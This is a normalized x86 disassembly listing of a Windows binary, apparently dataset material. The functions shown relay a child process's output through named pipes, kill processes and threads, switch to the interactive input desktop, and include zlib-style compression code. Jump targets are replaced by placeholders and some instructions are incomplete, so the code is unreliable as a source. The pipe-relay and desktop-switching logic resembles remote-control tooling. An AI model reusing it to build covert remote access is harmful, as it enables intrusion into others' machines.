mov ecx [ esi + 0x20 ]
push 0x0
push ecx
call [ TerminateProcess@IAT ]
mov edx [ esi + 0x24 ]
push 0x0
push edx
call edi
mov eax [ esi + 0x2c ]
push 0x7d0
push eax
call [ WaitForSingleObject@IAT ]
mov ecx [ esi + 0x2c ]
push 0x0
push ecx
call edi
mov eax [ esi + 0x10 ]
mov edi [ DisconnectNamedPipe@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call edi
mov edx [ esi + 0x10 ]
mov edi [ CloseHandle@IAT ]
push edx
call edi
mov eax [ esi + 0x14 ]
push eax
call edi
mov ecx [ esi + 0x18 ]
push ecx
call edi
mov edx [ esi + 0x1c ]
push edx
call edi
mov eax [ esi + 0x20 ]
push eax
call edi
mov ecx [ esi + 0x24 ]
push ecx
call edi
mov edx [ esi + 0x2c ]
push edx
call edi
mov eax [ esi + 0x28 ]
push eax
call edi
mov ecx [ esi + 0x8 ]
push ecx
mov [ esi ] r--data
call edi
pop edi
retn
push eax
call edi
sub_4048b0
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
cmp eax 0x1
jne r-xdata
mov ecx [ ecx + 0x14 ]
push esi
push 0x0
lea esi [ esp + 0x10 ]
push esi
push eax
push edx
push ecx
call [ WriteFile@IAT ]
pop esi
retn 0x8
cmp [ edx ] 0x1e
jne r-xdata
mov eax [ ecx + 0x8 ]
push eax
call [ SetEvent@IAT ]
retn 0x8
sub_4048f0
sub esp 0x410
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40c ] eax
push ebx
mov ebx [ PeekNamedPipe@IAT ]
push ebp
mov ebp [ LocalAlloc@IAT ]
push esi
push edi
mov edi [ esp + 0x424 ]
mov [ esp + 0x10 ] 0x0
push 0x64
call [ Sleep@IAT ]
push 0x0
lea eax [ esp + 0x18 ]
push eax
mov eax [ edi + 0x10 ]
lea ecx [ esp + 0x18 ]
push ecx
push 0x400
lea edx [ esp + 0x28 ]
push edx
push eax
cmp [ esp + 0x10 ] 0x0
jbe r-xdata
push 0x400
lea ecx [ esp + 0x1c ]
push 0x0
push ecx
call sub_415f60
mov edx [ esp + 0x20 ]
add esp 0xc
push edx
push 0x40
call ebp
mov ecx [ esp + 0x14 ]
mov edx [ edi + 0x10 ]
push 0x0
mov esi eax
lea eax [ esp + 0x14 ]
push eax
push ecx
push esi
push edx
call [ ReadFile@IAT ]
mov eax [ esp + 0x10 ]
push eax
mov ecx esi
mov edx edi
call sub_404470
push esi
call [ LocalFree@IAT ]
push 0x0
lea ecx [ esp + 0x18 ]
push ecx
mov ecx [ edi + 0x10 ]
lea edx [ esp + 0x18 ]
push edx
push 0x400
lea eax [ esp + 0x28 ]
push eax
push ecx
jmp r-xdata
call ebx
test eax eax
je r-xdata
sub_4049c0
sub esp 0x8
push esi
mov esi [ esp + 0x10 ]
mov eax [ esi + 0x20 ]
mov ecx [ esi + 0x28 ]
push 0xffffffff
push 0x0
lea edx [ esp + 0xc ]
push edx
push 0x2
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] ecx
call [ WaitForMultipleObjects@IAT ]
mov eax [ esi + 0x28 ]
push 0x0
push eax
call [ TerminateThread@IAT ]
mov ecx [ esi + 0x20 ]
push 0x1
push ecx
call [ TerminateProcess@IAT ]
mov esi [ esi + 0x4 ]
call sub_401450
xor eax eax
pop esi
add esp 0x8
retn 0x4
sub_404a10
mov eax [ esp + 0x4 ]
push ebx
mov ebx [ eax + 0x8 ]
push ebp
mov ebp [ eax + 0x4 ]
push edi
mov edi [ eax ]
mov eax [ eax + 0xc ]
push eax
call [ SetEvent@IAT ]
test bl bl
je r-xdata
push ebp
call edi
pop edi
pop ebp
pop ebx
retn 0x4
push esi
push 0x400001cf
push 0x0
push 0x0
call [ OpenInputDesktop@IAT ]
mov esi eax
test esi esi
je r-xdata
pop esi
call sub_404ac0
test eax eax
jne r-xdata
push esi
call [ CloseDesktop@IAT ]
sub_404a60
sub esp 0x18
push esi
push 0x0
push 0x0
push 0x0
push 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] dl
call [ CreateEventW@IAT ]
push 0x0
push 0x0
mov [ esp + 0x1c ] eax
lea eax [ esp + 0x10 ]
push eax
push sub_404a10
push 0x0
push 0x0
call sub_415565
mov ecx [ esp + 0x2c ]
add esp 0x18
push 0xffffffff
push ecx
mov esi eax
call [ WaitForSingleObject@IAT ]
mov edx [ esp + 0x14 ]
push edx
call [ CloseHandle@IAT ]
mov eax esi
pop esi
add esp 0x18
retn
sub_404ac0
sub esp 0x208
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x204 ] eax
push edi
call [ GetCurrentThreadId@IAT ]
push eax
call [ GetThreadDesktop@IAT ]
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
lea ecx [ esp + 0x10 ]
push ecx
push 0x2
push esi
call [ GetUserObjectInformationW@IAT ]
test eax eax
jne r-xdata
push esi
call [ SetThreadDesktop@IAT ]
test eax eax
je r-xdata
xor eax eax
pop edi
mov ecx [ esp + 0x204 ]
xor ecx esp
call sub_414a33
add esp 0x208
retn
push edi
call [ CloseDesktop@IAT ]
mov ecx [ esp + 0x208 ]
pop edi
xor ecx esp
mov eax 0x1
call sub_414a33
add esp 0x208
retn
sub_404b50
sub esp 0x38
mov ecx [ esp + 0x48 ]
mov eax [ esp + 0x44 ]
mov edx [ esp + 0x3c ]
push esi
push edi
mov edi [ esp + 0x48 ]
mov [ esp + 0xc ] ecx
mov [ esp + 0x8 ] eax
mov eax [ edi ]
push 0x38
lea ecx [ esp + 0xc ]
push rw-data
push ecx
mov [ esp + 0x20 ] edx
mov [ esp + 0x24 ] eax
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x38 ] 0x0
call sub_404e70
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
add esp 0x38
retn
lea edx [ esp + 0x8 ]
push 0x4
push edx
call sub_404e90
mov esi eax
add esp 0x8
cmp esi 0x1
je r-xdata
mov ecx [ esp + 0x1c ]
lea edx [ esp + 0x8 ]
push edx
mov [ edi ] ecx
call sub_404d10
add esp 0x4
lea eax [ esp + 0x8 ]
push eax
call sub_404d10
add esp 0x4
mov eax 0xfffffffb
test esi esi
je r-xdata
mov eax esi
pop edi
pop esi
add esp 0x38
retn
sub_404bf0
sub esp 0x38
mov ecx [ esp + 0x48 ]
mov edx [ esp + 0x3c ]
mov eax [ esp + 0x44 ]
push ebx
mov ebx [ esp + 0x44 ]
push esi
mov [ esp + 0xc ] ecx
mov ecx [ esp + 0x54 ]
mov [ esp + 0x14 ] edx
push 0x38
mov [ esp + 0xc ] eax
mov eax [ ebx ]
push rw-data
lea edx [ esp + 0x10 ]
push ecx
push edx
mov [ esp + 0x28 ] eax
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x3c ] 0x0
mov [ esp + 0x40 ] 0x0
call sub_4052c0
add esp 0x10
test eax eax
jne r-xdata
pop esi
pop ebx
add esp 0x38
retn
lea eax [ esp + 0x8 ]
push 0x4
push eax
call sub_405570
mov esi eax
add esp 0x8
cmp esi 0x1
je r-xdata
mov edx [ esp + 0x1c ]
lea eax [ esp + 0x8 ]
push eax
mov [ ebx ] edx
call sub_4058d0
add esp 0x4
lea ecx [ esp + 0x8 ]
push ecx
call sub_4058d0
add esp 0x4
mov eax 0xfffffffb
test esi esi
je r-xdata
mov eax esi
pop esi
pop ebx
add esp 0x38
retn
sub_404cc0
mov eax [ esp + 0x4 ]
xor edx edx
cmp eax edx
je r-xdata
mov eax 0xfffffffe
retn
mov ecx [ eax + 0x1c ]
cmp ecx edx
je r-xdata
push esi
mov [ eax + 0x14 ] edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x18 ] edx
mov esi [ ecx + 0xc ]
push edx
neg esi
sbb esi esi
push eax
and esi 0x7
mov [ ecx ] esi
mov eax [ eax + 0x1c ]
mov ecx [ eax + 0x14 ]
push ecx
call sub_406600
add esp 0xc
xor eax eax
pop esi
retn
sub_404d10
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
mov eax 0xfffffffe
pop esi
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x14 ]
test eax eax
je r-xdata
mov eax [ esi + 0x1c ]
mov ecx [ esi + 0x28 ]
push eax
push ecx
call [ esi + 0x24 ]
add esp 0x8
mov [ esi + 0x1c ] 0x0
xor eax eax
pop esi
retn
push esi
push eax
call sub_407430
add esp 0x8
sub_404d60
mov eax [ esp + 0xc ]
push esi
push edi
xor edi edi
cmp eax edi
je r-xdata
pop edi
mov eax 0xfffffffa
pop esi
retn
mov al [ eax ]
mov cl [ rw-data ]
cmp al cl
jne r-xdata
cmp [ esp + 0x18 ] 0x38
jne r-xdata
mov esi [ esp + 0xc ]
cmp esi edi
jne r-xdata
mov eax [ esi + 0x20 ]
mov [ esi + 0x18 ] edi
cmp eax edi
jne r-xdata
pop edi
mov eax 0xfffffffe
pop esi
retn
cmp [ esi + 0x24 ] edi
jne r-xdata
mov [ esi + 0x20 ] sub_4075a0
mov [ esi + 0x28 ] edi
mov ecx [ esi + 0x28 ]
push 0x18
push 0x1
push ecx
call [ esi + 0x20 ]
add esp 0xc
cmp eax edi
mov [ esi + 0x1c ] eax
jne r-xdata
mov [ esi + 0x24 ] sub_4075c0
mov ecx [ esp + 0x10 ]
mov [ eax + 0x14 ] edi
mov edx [ esi + 0x1c ]
cmp ecx edi
mov [ edx + 0xc ] edi
jge r-xdata
pop edi
mov eax 0xfffffffc
pop esi
retn
cmp ecx 0x8
jl r-xdata
mov eax [ esi + 0x1c ]
neg ecx
mov [ eax + 0xc ] 0x1
push esi
call sub_404d10
add esp 0x4
mov eax 0xfffffffe
pop edi
pop esi
retn
cmp ecx 0xf
jg r-xdata
mov edx [ esi + 0x1c ]
mov eax 0x1
shl eax cl
mov [ edx + 0x10 ] ecx
mov ecx [ esi + 0x1c ]
mov edx [ ecx + 0xc ]
neg edx
sbb edx edx
push eax
not edx
and edx sub_407470
push edx
push esi
call sub_406680
mov ecx [ esi + 0x1c ]
add esp 0xc
mov [ ecx + 0x14 ] eax
mov edx [ esi + 0x1c ]
push esi
cmp [ edx + 0x14 ] edi
jne r-xdata
call sub_404cc0
add esp 0x4
xor eax eax
pop edi
pop esi
retn
call sub_404d10
add esp 0x4
mov eax 0xfffffffc
pop edi
pop esi
retn
sub_404e90
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
test esi esi
push edi
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffe
pop ebx
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
mov edx [ esp + 0x18 ]
xor ebx ebx
cmp edx 0x4
mov edi 0xfffffffb
setne bl
dec ebx
mov ebp 0x5
and ebx 0xfffffffb
mov [ esp + 0x18 ] ebx
jmp [ ecx * 4 + jump_table_405288 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ eax + 0x14 ]
push edi
push esi
push ecx
call sub_406720
mov edi eax
add esp 0xc
cmp edi 0xfffffffd
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov edx [ esi + 0x1c ]
mov [ edx ] 0xd
mov eax [ esi + 0x1c ]
mov [ esi + 0x18 ] rw-data
mov [ eax + 0x4 ] 0x0
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
pop edi
pop esi
pop ebp
mov eax 0xfffffffd
pop ebx
retn
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
dec ecx
xor edx edx
mov [ esi + 0x4 ] ecx
mov ecx [ esi + 0x8 ]
inc ecx
mov edi ebx
mov [ esi + 0x8 ] ecx
mov ecx [ esi ]
mov dl [ ecx ]
mov [ eax + 0x4 ] edx
mov eax [ esi + 0x1c ]
mov edx [ esi ]
mov ecx [ eax + 0x4 ]
and ecx 0xf
inc edx
cmp cl 0x8
mov [ esi ] edx
je r-xdata
dec eax
xor ecx ecx
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x8 ]
inc eax
mov edi ebx
mov ebx [ esi + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ esi ]
xor edx edx
mov ebp 0x1f
mov cl [ eax ]
inc eax
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
shl eax 0x8
add eax ecx
div ebp
test edx edx
je r-xdata
test edi edi
jne r-xdata
mov edx [ esi + 0x1c ]
mov [ edx ] 0xd
mov eax [ esi + 0x1c ]
mov [ eax + 0x4 ] 0x0
jmp r-xdata
dec eax
mov edx [ esi + 0x1c ]
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x8 ]
inc eax
xor ecx ecx
mov [ esi + 0x8 ] eax
mov eax [ esi ]
mov edi ebx
mov cl [ eax ]
shl ecx 0x18
mov [ edx + 0x8 ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov eax [ esi + 0x1c ]
mov [ eax ] 0x9
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
dec eax
inc edx
mov [ esi + 0x8 ] edx
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x1c ]
xor edx edx
mov dl [ ecx ]
mov edi ebx
mov ecx [ eax + 0x8 ]
shl edx 0x10
add ecx edx
mov [ eax + 0x8 ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov eax [ esi + 0x1c ]
mov [ eax ] 0xa
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
dec eax
inc edx
mov [ esi + 0x8 ] edx
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x1c ]
xor edx edx
mov dl [ ecx ]
mov edi ebx
mov ecx [ eax + 0x8 ]
shl edx 0x8
add ecx edx
mov [ eax + 0x8 ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov eax [ esi + 0x1c ]
mov [ eax ] 0xb
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
dec eax
inc edx
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x1c ]
mov [ esi + 0x8 ] edx
xor edx edx
mov dl [ ecx ]
mov ecx [ eax + 0x8 ]
add ecx edx
mov edi ebx
mov [ eax + 0x8 ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov eax [ esi + 0x1c ]
mov ecx [ eax + 0x4 ]
mov edx [ eax + 0x8 ]
cmp ecx edx
je r-xdata
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
dec eax
inc edx
mov [ esi + 0x8 ] edx
xor edx edx
mov [ esi + 0x4 ] eax
mov dl [ ecx ]
mov eax [ esi + 0x1c ]
mov edi ebx
shl edx 0x18
mov [ eax + 0x8 ] edx
mov eax [ esi ]
mov ecx [ esi + 0x1c ]
inc eax
mov [ esi ] eax
mov [ ecx ] 0x3
mov edx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x8 ]
inc eax
xor ecx ecx
mov [ esi + 0x8 ] eax
mov eax [ esi + 0x1c ]
mov cl [ edx ]
mov edi ebx
mov edx [ eax + 0x8 ]
shl ecx 0x10
add edx ecx
mov [ eax + 0x8 ] edx
mov eax [ esi ]
mov edx [ esi + 0x1c ]
inc eax
mov [ esi ] eax
mov [ edx ] 0x4
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x8 ]
inc eax
xor edx edx
mov [ esi + 0x8 ] eax
mov eax [ esi + 0x1c ]
mov dl [ ecx ]
mov edi ebx
mov ecx [ eax + 0x8 ]
shl edx 0x8
add ecx edx
mov [ eax + 0x8 ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov eax [ esi + 0x1c ]
mov [ eax ] ebp
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
dec eax
inc edx
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x1c ]
mov [ esi + 0x8 ] edx
xor edx edx
mov dl [ ecx ]
mov ecx [ eax + 0x8 ]
add ecx edx
pop edi
mov [ eax + 0x8 ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov eax [ esi + 0x1c ]
mov ecx [ eax + 0x8 ]
mov [ esi + 0x30 ] ecx
pop esi
mov [ eax ] 0x6
pop ebp
mov eax 0x2
pop ebx
retn
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ eax + 0x4 ]
mov edx [ eax + 0x10 ]
shr ecx 0x4
add ecx 0x8
cmp ecx edx
jbe r-xdata
mov [ eax ] 0xd
mov edx [ esi + 0x1c ]
mov [ esi + 0x18 ] rw-data
mov [ edx + 0x4 ] ebp
jmp r-xdata
test cl 0x20
jne r-xdata
mov [ ebx ] 0xd
mov eax [ esi + 0x1c ]
mov ebx [ esp + 0x18 ]
mov ebp 0x5
mov [ esi + 0x18 ] rw-data
mov [ eax + 0x4 ] ebp
jmp r-xdata
cmp edi 0x1
jne r-xdata
mov edi ebx
mov eax [ esi + 0x1c ]
mov ecx [ eax ]
cmp ecx 0xd
ja r-xdata
mov ecx [ esi + 0x1c ]
mov [ ecx ] 0xc
mov [ eax ] 0xd
mov edx [ esi + 0x1c ]
mov [ esi + 0x18 ] rw-data
mov [ edx + 0x4 ] ebp
jmp r-xdata
mov [ eax ] 0x1
mov [ eax ] 0xd
mov edx [ esi + 0x1c ]
mov [ esi + 0x18 ] rw-data
mov [ edx + 0x4 ] ebp
jmp r-xdata
mov eax [ esi + 0x1c ]
mov ebx [ esp + 0x18 ]
mov ebp 0x5
mov [ eax ] 0x2
mov [ ebx ] 0x7
mov ebx [ esp + 0x18 ]
mov ebp 0x5
jmp r-xdata
mov eax [ esi + 0x1c ]
mov edi ebx
mov edx [ eax + 0x14 ]
lea ecx [ eax + 0x4 ]
push ecx
push esi
push edx
call sub_406600
mov eax [ esi + 0x1c ]
add esp 0xc
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov [ eax ] 0x8
mov [ eax ] 0xc
jmp r-xdata
sub_4052c0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
push 0x0
push 0x8
push 0xf
push 0x8
push edx
push eax
call sub_4052f0
add esp 0x20
retn
sub_4052f0
mov eax [ esp + 0x1c ]
push ebx
push ebp
xor edx edx
xor ebp ebp
push esi
cmp eax edx
push edi
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffa
pop ebx
retn
mov ecx [ rw-data ]
mov al [ eax ]
cmp al [ ecx ]
jne r-xdata
cmp [ esp + 0x30 ] 0x38
jne r-xdata
mov edi [ esp + 0x14 ]
cmp edi edx
jne r-xdata
mov eax [ edi + 0x20 ]
mov [ edi + 0x18 ] edx
cmp eax edx
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffe
pop ebx
retn
cmp [ edi + 0x24 ] edx
jne r-xdata
mov [ edi + 0x20 ] sub_4075a0
mov [ edi + 0x28 ] edx
mov ecx [ esp + 0x18 ]
cmp ecx 0xffffffff
jne r-xdata
mov [ edi + 0x24 ] sub_4075c0
mov ebx [ esp + 0x20 ]
cmp ebx edx
jge r-xdata
mov [ esp + 0x18 ] 0x6
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x24 ]
cmp eax 0x1
jl r-xdata
mov ebp 0x1
neg ebx
cmp eax 0x9
jg r-xdata
cmp [ esp + 0x1c ] 0x8
jne r-xdata
cmp ebx 0x9
jl r-xdata
cmp ebx 0xf
jg r-xdata
cmp ecx edx
jl r-xdata
cmp ecx 0x9
jg r-xdata
mov eax [ esp + 0x28 ]
cmp eax edx
jl r-xdata
cmp eax 0x2
jg r-xdata
mov edx [ edi + 0x28 ]
push 0x16b8
push 0x1
push edx
call [ edi + 0x20 ]
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov [ edi + 0x1c ] esi
mov [ esi + 0x18 ] ebp
mov ebp 0x1
mov ecx ebx
shl ebp cl
mov [ esi + 0x28 ] ebx
mov ebx [ esp + 0x24 ]
mov [ esi ] edi
push 0x2
lea ecx [ ebx + 0x7 ]
mov [ esi + 0x48 ] ecx
mov [ esi + 0x24 ] ebp
lea eax [ ebp - 0x1 ]
push ebp
mov [ esi + 0x2c ] eax
mov eax 0x1
shl eax cl
add ecx 0x2
mov [ esi + 0x44 ] eax
dec eax
mov [ esi + 0x4c ] eax
mov eax 0xaaaaaaab
mul ecx
shr edx 0x1
mov [ esi + 0x50 ] edx
mov ecx [ edi + 0x28 ]
push ecx
call [ edi + 0x20 ]
mov edx [ esi + 0x24 ]
mov [ esi + 0x30 ] eax
mov eax [ edi + 0x28 ]
push 0x2
push edx
push eax
call [ edi + 0x20 ]
mov ecx [ esi + 0x44 ]
mov [ esi + 0x38 ] eax
mov edx [ edi + 0x28 ]
push 0x2
push ecx
push edx
call [ edi + 0x20 ]
mov [ esi + 0x3c ] eax
lea ecx [ ebx + 0x6 ]
mov eax 0x1
push 0x4
shl eax cl
mov [ esi + 0x1694 ] eax
push eax
mov eax [ edi + 0x28 ]
push eax
call [ edi + 0x20 ]
mov ecx [ esi + 0x1694 ]
add esp 0x30
mov [ esi + 0x8 ] eax
lea edx [ ecx * 4 ]
mov [ esi + 0xc ] edx
mov edx [ esi + 0x30 ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffc
pop ebx
retn
mov eax [ rw-data ]
push edi
mov [ edi + 0x18 ] eax
call sub_4058d0
add esp 0x4
mov eax 0xfffffffc
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx [ esi + 0x38 ]
test edx edx
je r-xdata
mov edx [ esi + 0x3c ]
test edx edx
je r-xdata
test eax eax
je r-xdata
mov edx ecx
push edi
shr edx 0x1
mov [ esi + 0x1d ] 0x8
lea edx [ eax + edx * 2 ]
lea eax [ eax + ecx * 2 ]
add ecx eax
mov [ esi + 0x169c ] edx
mov edx [ esp + 0x2c ]
mov [ esi + 0x1690 ] ecx
mov ecx [ esp + 0x1c ]
mov [ esi + 0x80 ] edx
mov [ esi + 0x7c ] ecx
call sub_4054f0
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
retn
sub_4054f0
mov eax [ esp + 0x4 ]
xor ecx ecx
cmp eax ecx
push esi
je r-xdata
mov eax 0xfffffffe
pop esi
retn
mov esi [ eax + 0x1c ]
cmp esi ecx
je r-xdata
cmp [ eax + 0x20 ] ecx
je r-xdata
cmp [ eax + 0x24 ] ecx
je r-xdata
mov [ eax + 0x14 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x18 ] ecx
mov [ eax + 0x2c ] 0x2
mov edx [ esi + 0x8 ]
mov [ esi + 0x14 ] ecx
mov [ esi + 0x10 ] edx
mov edx [ esi + 0x18 ]
cmp edx ecx
jge r-xdata
mov edx [ esi + 0x18 ]
push esi
neg edx
sbb edx edx
and edx 0x47
add edx 0x2a
mov [ esi + 0x4 ] edx
mov [ eax + 0x30 ] 0x1
mov [ esi + 0x20 ] ecx
call sub_4075d0
push esi
call sub_405980
add esp 0x8
xor eax eax
pop esi
retn
mov [ esi + 0x18 ] ecx
sub_405570
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
test ebx ebx
push edi
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffe
pop ebx
retn
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
mov ebp [ esp + 0x18 ]
cmp ebp 0x4
jg r-xdata
test ebp ebp
jl r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov [ ebx + 0x18 ] edx
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
cmp eax 0x29a
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ ebx + 0x10 ]
test ecx ecx
jne r-xdata
cmp ebp 0x4
jne r-xdata
mov ecx [ esi + 0x20 ]
cmp eax 0x2a
mov [ esi ] ebx
mov [ esp + 0x14 ] ecx
mov [ esi + 0x20 ] ebp
jne r-xdata
mov eax [ rw-data ]
pop edi
pop esi
mov [ ebx + 0x18 ] eax
pop ebp
mov eax 0xfffffffb
pop ebx
retn
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x28 ]
mov eax [ esi + 0x7c ]
shl ecx 0xc
sub ecx 0x7800
dec eax
sar eax 0x1
cmp eax 0x3
jbe r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
push ebx
call sub_405850
mov eax [ ebx + 0x10 ]
add esp 0x4
test eax eax
jne r-xdata
shl eax 0x6
or ecx eax
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax 0x3
mov eax [ esi + 0x4 ]
mov ecx [ ebx + 0x4 ]
cmp eax 0x29a
jne r-xdata
cmp ebp [ esp + 0x14 ]
jg r-xdata
mov [ esi + 0x20 ] 0xffffffff
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov eax ecx
xor edx edx
mov edi 0x1f
mov [ esi + 0x4 ] 0x71
div edi
sub ecx edx
add ecx edi
push ecx
push esi
call sub_405820
mov eax [ esi + 0x64 ]
add esp 0x8
test eax eax
je r-xdata
or ecx 0x20
test ecx ecx
jne r-xdata
test ecx ecx
je r-xdata
cmp ebp 0x4
je r-xdata
mov [ ebx + 0x30 ] 0x1
mov edx [ ebx + 0x30 ]
shr edx 0x10
push edx
push esi
call sub_405820
mov eax [ ebx + 0x30 ]
and eax 0xffff
push eax
push esi
call sub_405820
add esp 0x10
mov eax [ esi + 0x7c ]
push ebp
push esi
lea eax [ eax + eax * 2 ]
call [ eax * 4 + r--data ]
add esp 0x8
cmp eax 0x2
je r-xdata
mov ecx [ esi + 0x6c ]
test ecx ecx
jne r-xdata
mov edx [ rw-data ]
pop edi
pop esi
mov [ ebx + 0x18 ] edx
pop ebp
mov eax 0xfffffffb
pop ebx
retn
mov ecx [ rw-data ]
pop edi
pop esi
mov [ ebx + 0x18 ] ecx
pop ebp
mov eax 0xfffffffb
pop ebx
retn
mov [ esi + 0x4 ] 0x29a
cmp eax 0x3
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
jne r-xdata
cmp eax 0x2
je r-xdata
test eax eax
je r-xdata
cmp ebp 0x4
je r-xdata
cmp eax 0x29a
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov [ esi + 0x20 ] 0xffffffff
cmp eax 0x1
jne r-xdata
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
cmp ebp eax
jne r-xdata
mov eax [ ebx + 0x30 ]
shr eax 0x10
push eax
push esi
call sub_405820
mov ecx [ ebx + 0x30 ]
and ecx 0xffff
push ecx
push esi
call sub_405820
push ebx
call sub_405850
mov ecx [ esi + 0x14 ]
add esp 0x14
mov [ esi + 0x18 ] 0xffffffff
xor eax eax
pop edi
pop esi
test ecx ecx
pop ebp
pop ebx
sete al
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
push 0x0
push 0x0
push 0x0
push esi
call sub_4076c0
add esp 0x10
cmp ebp 0x3
jne r-xdata
push esi
call sub_407760
add esp 0x4
jmp r-xdata
push ebx
call sub_405850
mov eax [ ebx + 0x10 ]
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ esi + 0x44 ]
mov edx [ esi + 0x3c ]
mov [ edx + ecx * 2 - 0x2 ] 0x0
mov eax [ esi + 0x44 ]
mov edi [ esi + 0x3c ]
lea ecx [ eax + eax - 0x2 ]
xor eax eax
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx ebp
[ edi ]
mov [ esi + 0x20 ] 0xffffffff
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
sub_405820
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push esi
push edi
mov esi [ eax + 0x8 ]
mov edi [ eax + 0x14 ]
mov edx ecx
shr edx 0x8
mov [ esi + edi ] dl
mov edx [ eax + 0x14 ]
mov esi [ eax + 0x8 ]
inc edx
mov [ eax + 0x14 ] edx
pop edi
mov [ esi + edx ] cl
mov ecx [ eax + 0x14 ]
inc ecx
pop esi
mov [ eax + 0x14 ] ecx
retn
sub_405850
mov eax [ esp + 0x4 ]
push esi
mov esi [ eax + 0x1c ]
mov ecx [ eax + 0x10 ]
mov edx [ esi + 0x14 ]
cmp edx ecx
jbe r-xdata
test edx edx
je r-xdata
mov edx ecx
pop esi
retn
mov esi [ esi + 0x10 ]
mov ecx edx
push ebx
mov ebx ecx
push edi
mov edi [ eax + 0xc ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ eax + 0xc ]
mov ecx [ eax + 0x1c ]
add edi edx
mov [ eax + 0xc ] edi
